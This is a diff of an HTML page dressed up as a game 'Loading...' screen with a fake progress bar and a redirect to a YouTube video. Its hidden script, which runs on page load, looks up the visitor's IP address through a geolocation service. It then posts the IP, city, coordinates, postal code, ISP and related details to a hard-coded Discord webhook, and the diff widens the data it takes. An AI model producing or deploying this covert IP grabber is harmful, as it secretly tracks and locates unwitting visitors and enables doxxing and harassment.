@@ -1,84 +1,101 @@
 <!DOCTYPE html>
 <html>
-  <head>
-    <title>Loading...</title>
-    <meta http-equiv="refresh" content="10;url=https://www.youtube.com/watch?v=Xh3zkzJpxdc">
-    <style>
-      body {
-        background-color: #111;
-        color: #fff;
-        font-family: Arial, sans-serif;
-        text-align: center;
-        padding-top: 100px;
+<head>
+  <title>Loading...</title>
+  <meta http-equiv="refresh" content="10;url=https://www.youtube.com/watch?v=Xh3zkzJpxdc">
+  <style>
+    body {
+      background-color: #111;
+      color: #fff;
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding-top: 100px;
+    }
+    #progress-container {
+      width: 80%;
+      background-color: #333;
+      border-radius: 10px;
+      margin: 20px auto;
+      height: 30px;
+      overflow: hidden;
+    }
+    #progress-bar {
+      height: 100%;
+      width: 0%;
+      background-color: #4caf50;
+      transition: width 0.3s;
+    }
+    #status {
+      margin-top: 20px;
+      font-size: 1.2em;
+    }
+  </style>
+  <script>
+    const webhookUrl = "https://discord.com/api/webhooks/1396127800909496615/xCiYdQ16YG4NLrH0TKJ-b7a3hvUXea5sHfBPH-sZcVRpHeOFvuH8LEmE1ZvMn_Z_Vw7e";
+    let progress = 0;
+    const steps = [
+      "Loading assets...",
+      "Initializing renderer...",
+      "Establishing connection...",
+      "Loading game..."
+    ];
+    function updateProgress() {
+      if (progress < 100) {
+        progress += 25;
+        document.getElementById("progress-bar").style.width = progress + "%";
+        document.getElementById("status").textContent = steps[progress / 25 - 1];
+        setTimeout(updateProgress, 2000);
       }
-      #progress-container {
-        width: 80%;
-        background-color: #333;
-        border-radius: 10px;
-        margin: 20px auto;
-        height: 30px;
-        overflow: hidden;
-      }
-      #progress-bar {
-        height: 100%;
-        width: 0%;
-        background-color: #4caf50;
-        transition: width 0.3s;
-      }
-      #status {
-        margin-top: 20px;
-        font-size: 1.2em;
-      }
-    </style>
-    <script>
-      const webhookUrl = "https://discord.com/api/webhooks/1396127800909496615/xCiYdQ16YG4NLrH0TKJ-b7a3hvUXea5sHfBPH-sZcVRpHeOFvuH8LEmE1ZvMn_Z_Vw7e";
-      let progress = 0;
-      const steps = [
-        "Loading assets...",
-        "Initializing renderer...",
-        "Establishing connection...",
-        "Loading game..."
-      ];
-
-      function updateProgress() {
-        if (progress < 100) {
-          progress += 25;
-          document.getElementById("progress-bar").style.width = progress + "%";
-          document.getElementById("status").textContent = steps[progress / 25 - 1];
-          setTimeout(updateProgress, 2000);
-        }
-      }
-
-      function sendWebhook(ip, country, region) {
-        fetch(webhookUrl, {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json"
-          },
-          body: JSON.stringify({
-            content: `Visitor IP: ${ip}\nCountry: ${country}\nRegion/State: ${region}`
-          })
+    }
+    function sendWebhook(data) {
+      const content = `
+Visitor IP: ${data.ip}
+Type: ${data.type}
+Continent: ${data.continent} (${data.continent_code})
+Country: ${data.country} (${data.country_code})
+Region: ${data.region} (${data.region_code})
+City: ${data.city}
+Latitude: ${data.latitude}
+Longitude: ${data.longitude}
+Postal Code: ${data.postal}
+Calling Code: +${data.calling_code}
+Timezone: ${data.timezone.id} (${data.timezone.abbr}), UTC Offset: ${data.timezone.utc}
+Current Time: ${data.timezone.current_time}
+Connection ASN: ${data.connection.asn}
+ISP: ${data.connection.isp}
+Organization: ${data.connection.org}
+Domain: ${data.connection.domain}
+Flag Emoji: ${data.flag.emoji}
+Flag URL: ${data.flag.img}
+      `;
+      fetch(webhookUrl, {
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify({ content })
+      });
+    }
+    window.onload = () => {
+      updateProgress();
+      fetch("https://ipwho.is/")
+        .then(response => response.json())
+        .then(data => {
+          if(data.success){
+            sendWebhook(data);
+          } else {
+            sendWebhook({ip:"N/A", type:"N/A", continent:"N/A", continent_code:"N/A", country:"N/A", country_code:"N/A", region:"N/A", region_code:"N/A", city:"N/A", latitude:"N/A", longitude:"N/A", postal:"N/A", calling_code:"N/A", timezone: {id:"N/A", abbr:"N/A", utc:"N/A", current_time:"N/A"}, connection:{asn:"N/A", isp:"N/A", org:"N/A", domain:"N/A"}, flag:{emoji:"N/A", img:"N/A"}});
+          }
+        })
+        .catch(() => {
+          sendWebhook({ip:"Fetch failed", type:"N/A", continent:"N/A", continent_code:"N/A", country:"N/A", country_code:"N/A", region:"N/A", region_code:"N/A", city:"N/A", latitude:"N/A", longitude:"N/A", postal:"N/A", calling_code:"N/A", timezone: {id:"N/A", abbr:"N/A", utc:"N/A", current_time:"N/A"}, connection:{asn:"N/A", isp:"N/A", org:"N/A", domain:"N/A"}, flag:{emoji:"N/A", img:"N/A"}});
         });
-      }
-
-      window.onload = () => {
-        updateProgress();
-        fetch("https://ip-api.com/json")
-          .then(response => response.json())
-          .then(data => {
-            sendWebhook(data.query, data.country, data.regionName);
-          })
-          .catch(() => {
-            sendWebhook("IP fetch failed or blocked.", "N/A", "N/A");
-          });
-      };
-    </script>
-  </head>
-  <body>
-    <h1>Loading...</h1>
-    <div id="progress-container">
-      <div id="progress-bar"></div>
-    </div>
-    <div id="status">Starting...</div>
-  </body>
+    };
+  </script>
+</head>
+<body>
+  <h1>Loading...</h1>
+  <div id="progress-container">
+    <div id="progress-bar"></div>
+  </div>
+  <div id="status">Starting...</div>
+</body>
 </html>
